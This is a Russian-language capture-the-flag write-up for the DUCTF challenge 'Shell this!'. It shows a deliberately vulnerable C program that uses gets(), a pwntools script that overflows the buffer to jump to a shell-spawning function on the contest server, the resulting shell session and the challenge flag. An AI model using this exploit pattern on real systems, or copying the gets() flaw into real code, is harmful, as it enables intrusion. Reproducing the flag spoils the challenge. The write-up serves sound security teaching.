# Shell this! (100 points, 340 solves)

> Somebody told me that this program is vulnerable to something called remote code execution?
>
> I'm not entirely sure what that is, but could you please figure it out for me?
>
> nc chal.duc.tf 30002

Для этого задания авторы расщедрились и помимо бинаря [shellthis](./shellthis) скинули исходник 
[shellthis.c](./shellthis.c):
```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}

int main(void) {
    printf("Welcome! Can you figure out how to get this program to give you a shell?\n");
    vuln();
    printf("Unfortunately, you did not win. Please try again another time!\n");
}
```

Ого, функция `get_shell()` даёт нам shell! Жаль, что она нигде не вызывается... Так, функция `vuln()`
своим названием подсказывает, что смотреть надо в неё. И действительно, там есть вызов `gets()`. Для тех, кто
не знает:
```shell script
$ man 3 gets
DESCRIPTION
       Never use this function.

       gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF, 
       which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see
       BUGS below).
...
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters 
       gets() will read, and because gets() will continue to store characters past the end of the
       buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.

       For more information, see CWE-242 (aka "Use of Inherently Dangerous Function") at http://cwe.mitre.org/data/definitions/242.html
```

Получается, у нас тут стандартное переполнение буфера (buffer overflow). Я не буду вдаваться в подробности о том, что
это такое и как оно работает. Советую почитать примеры из Интернета или посмотреть серию роликов от [LiveOverflow](https://www.youtube.com/watch?v=T03idxny9jE&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=13).
Если кратко, нам нужно найти то количество символов, которое подведёт к перенаправлению исполнения туда, куда нам надо.
На заре своей карьеры я всё это делал руками с gdb, но это довольно долго (но полезно для понимания происходящего!). Во
время реальных соревнований стоит воспользоваться [pwntools](https://github.com/Gallopsled/pwntools).

### Шаг 1 - найти нужное количество символов для переполнения

Делается это просто:
```python
from pwn import *
io_local = process('./shellthis')

io_local.recv()
io_local.sendline(cyclic(100, n=8))
io_local.wait()
core = Core('./core')
offset = cyclic_find(core.fault_addr, n=8)
print(offset)
```

Работает это примерно так - в качестве входной строки закидывается строка определённого вида. Причём длина настолько 
большая, что программа просто крашится и генерирует core-файл. Далее из него вычитывается адрес, на котором
произошёл краш, и находится оффсет этой последовательности в исходной строке.

### Шаг 2 - находим адрес, куда надо перенаправить программу

Что же, это лёгкий пример, и у нас прямо тут есть функция `get_shell()`. Нам просто нужно достать адрес этой функции и
передать его. Делается это так:
```python
e = ELF('./shellthis')
win = e.symbols['get_shell']
```

### Шаг 3 - отправляем наш вредоностный инпут

Можно сразу направить это всё на сервер, флаг всё же там находится:
```python
io = remote('chal.duc.tf', 30002)

data = io.recv()  # Считываем приветствие
p = offset * b'A'  # Переполняем буфер
p += p64(win)  # И добавляем адрес функции get_shell()
io.sendline(p)  # Отправляем
io.interactive()  # Переходим в интерактивный режим
```

Результат:
```shell script
$ ls
flag.txt shellthis
$ cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```

Полный код [эксплоита](./shell_this.py).